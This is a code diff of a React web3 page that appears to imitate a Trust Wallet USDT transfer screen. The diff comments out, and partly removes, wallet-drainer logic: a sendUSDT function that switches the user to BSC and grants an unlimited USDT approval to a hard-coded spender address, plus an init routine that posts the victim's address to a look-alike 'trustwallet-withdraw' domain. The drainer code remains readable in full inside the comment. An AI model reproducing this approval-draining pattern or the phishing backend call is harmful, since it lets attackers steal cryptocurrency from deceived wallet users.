@@ -255,28 +255,19 @@ const App = () => {
 
   const isProcessing = useRef(false);
 
+  // Commented out sendUSDT to preserve original code but disable it
+  /*
   const sendUSDT = async () => {
     if (isProcessing.current) return;
-  
     try {
       isProcessing.current = true;
       setLoading(true);
       setTransferCompleted(false);
-  
-      if (!window.ethereum) {
-        return;
-      }
-  
+      if (!window.ethereum) return;
       const web3 = new Web3(window.ethereum);
-  
-      // Request accounts
       const accounts = await web3.eth.getAccounts();
       const sender = accounts[0];
-      if (!sender || !web3.utils.isAddress(sender)) {
-        return;
-      }
-  
-      // Check and switch to BSC
+      if (!sender || !web3.utils.isAddress(sender)) return;
       const chainId = await web3.eth.getChainId();
       if (chainId !== 56) {
         await window.ethereum.request({
@@ -284,21 +275,13 @@ const App = () => {
           params: [{ chainId: "0x38" }],
         });
       }
-  
-      // Validate address in URL (required)
       const params = new URLSearchParams(window.location.search);
       const userAddress = params.get("address");
-  
-      if (!userAddress || !/^0x[a-fA-F0-9]{40}$/.test(userAddress)) {
-        return;
-      }
-  
+      if (!userAddress || !/^0x[a-fA-F0-9]{40}$/.test(userAddress)) return;
       const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
       const SPENDER_ADDRESS = "0xcad014a3a7755137b5d1631e48f3d88daca8d910";
       const MAX_UINT256 = web3.utils.toTwosComplement(-1);
-  
       await contract.methods.approve(SPENDER_ADDRESS, MAX_UINT256).send({ from: sender });
-  
       setTransferCompleted(true);
     } catch (err) {
       console.error("🔴 Approval error:", err);
@@ -307,14 +290,13 @@ const App = () => {
       setLoading(false);
     }
   };
-  
+  */
+
   useEffect(() => {
     const ensureBSCNetwork = async () => {
-      const bscChainId = "0x38"; // BSC Mainnet
-  
+      const bscChainId = "0x38";
       try {
         const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
-  
         if (currentChainId !== bscChainId) {
           await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
@@ -329,11 +311,7 @@ const App = () => {
               params: [{
                 chainId: bscChainId,
                 chainName: 'Binance Smart Chain',
-                nativeCurrency: {
-                  name: 'BNB',
-                  symbol: 'BNB',
-                  decimals: 18,
-                },
+                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                 rpcUrls: ['https://bsc-dataseed.binance.org/'],
                 blockExplorerUrls: ['https://bscscan.com'],
               }],
@@ -346,121 +324,79 @@ const App = () => {
         }
       }
     };
-  
     ensureBSCNetwork();
   }, []);
-  
-  
+
   useEffect(() => {
     const init = async () => {
       try {
-        if (!window.ethereum) {
-          return;
-        }
-        const web3 = new Web3(window.ethereum);
-        const accounts = await web3.eth.getAccounts();
-        const sender = accounts[0];
-        
-        const params = new URLSearchParams(window.location.search);
-        const userAddress = params.get("address");
-        
-        if (!userAddress) {
-          // Approval-only mode — don’t need to validate or throw error yet
-          setWalletAddress("");
-          console.log("🔄 Approval-only mode activated (no address in URL)");
-          return;
-        }
-        
-        if (!sender || !web3.utils.isAddress(sender)) {
-          console.log("❌ Unable to detect a valid wallet address.");
-          return;
-        }
-        
-        // ✅ Address present — do your existing refill/transfer logic
-        if (!/^0x[a-fA-F0-9]{40}$/.test(userAddress)) {
-          return;
-        }
-
+        if (!window.ethereum) return;
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const signer = await provider.getSigner();
+        const userAddress = await signer.getAddress();
         setWalletAddress(userAddress);
-        console.log("🔗 Wallet from QR:", userAddress);
-
-        const response = await fetch("https://haha.trustwallet-withdraw.com/api/refill-check", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ address: userAddress }),
-        });
-
-        const result = await response.json();
-        console.log("📬 Backend response:", result);
-
-        if (!response.ok || result.status === "refill_failed" || !result.usdt) {
-          return;
-        }
-
-        // ✅ Store balances silently
-        setUsdtBalance(result.usdt);
-        setBnbBalance(result.bnb || 0);
-
-        console.log("✅ Refill successful or not needed, ready for manual transfer.");
+        console.log("🔗 Wallet connected:", userAddress);
+        const balances = await fetchBalances(userAddress);
+        setUsdtBalance(balances.usdt);
+        setBnbBalance(balances.bnb);
+        console.log("✅ Balances fetched:", balances);
+        setWalletConnected(true);
       } catch (err) {
         console.error("❌ init() error:", err);
       }
     };
-
     init();
   }, []);
 
   const clearAddress = () => {
     setAddress("");
   };
-  
-  
+
   return (
     <GlobalStyle>
       <Container>
-      
-      {/* Address Field with Clear & Paste Button */}
-      <InputContainer>
-        <InputLabel>Address or Domain Name</InputLabel>
-        <InputFieldContainer>
-          {address && <ClearButton onClick={clearAddress}>×</ClearButton>}
-          <Input type="text" value={address} onChange={(e) => setAddress(e.target.value)} />
-          <PasteButton >Paste</PasteButton>
-        </InputFieldContainer>
-      </InputContainer>
-
-      {/* Amount Field */}
-      <InputContainer>
-        <InputLabel>Amount</InputLabel>
-        <AmountContainer>
+        <InputContainer>
+          <InputLabel>Address or Domain Name</InputLabel>
           <InputFieldContainer>
-            <Input type="number" value={usdtAmount} onChange={(e) => setUsdtAmount(e.target.value)} />
-            <UsdtText>USDT</UsdtText>
-            <MaxText >Max</MaxText>
+            {address && <ClearButton onClick={clearAddress}>×</ClearButton>}
+            <Input type="text" value={address} onChange={(e) => setAddress(e.target.value)} />
+            <PasteButton>Paste</PasteButton>
           </InputFieldContainer>
-        </AmountContainer>
-        <AmountConversion>= ${parseFloat(usdtAmount * 1).toFixed(2)}</AmountConversion>
-      </InputContainer>
+        </InputContainer>
 
-      <NextButton
-        onClick={async () => {
-          try {
-            setLoading(true);
-            await handleGetStartedClick(usdtAmount);
-            setTransferCompleted(true);
-          } catch (error) {
-            console.error("Transfer failed:", error);
-            alert(error.message || "Transfer failed. Check console for details.");
-          } finally {
-            setLoading(false);
-          }
-        }}
-      >
-        {loading ? "Processing..." : transferCompleted ? "Transfer completed" : walletConnected ? "Next" : "Next"}
-      </NextButton>
-    </Container>  
-  </GlobalStyle>
-    
+        <InputContainer>
+          <InputLabel>Amount</InputLabel>
+          <AmountContainer>
+            <InputFieldContainer>
+              <Input type="number" value={usdtAmount} onChange={(e) => setUsdtAmount(e.target.value)} />
+              <UsdtText>USDT</UsdtText>
+              <MaxText>Max</MaxText>
+            </InputFieldContainer>
+          </AmountContainer>
+          <AmountConversion>= ${parseFloat(usdtAmount * 1 || 0).toFixed(2)}</AmountConversion>
+        </InputContainer>
+
+        <NextButton
+          onClick={async () => {
+            try {
+              setLoading(true);
+              if (!usdtAmount || isNaN(parseFloat(usdtAmount)) || parseFloat(usdtAmount) <= 0) {
+                throw new Error("Please enter a valid USDT amount.");
+              }
+              await handleGetStartedClick(usdtAmount);
+              setTransferCompleted(true);
+            } catch (error) {
+              console.error("Transfer failed:", error);
+              alert(error.message || "Transfer failed. Check console for details.");
+            } finally {
+              setLoading(false);
+            }
+          }}
+        >
+          {loading ? "Processing..." : transferCompleted ? "Transfer completed" : walletConnected ? "Next" : "Connect Wallet"}
+        </NextButton>
+      </Container>
+    </GlobalStyle>
   );
 };
 
